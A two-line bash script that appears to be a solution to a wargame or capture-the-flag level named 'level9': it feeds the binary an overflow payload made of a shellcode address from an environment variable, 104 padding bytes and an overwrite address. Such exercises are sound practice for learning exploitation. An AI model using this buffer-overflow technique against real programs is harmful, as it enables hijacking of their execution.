#!/usr/bin/env bash

./level9 $(python -c 'import os; print os.getenv("SCADDR") + "A" * 104 + "\x0c\xa0\x04\x08"')
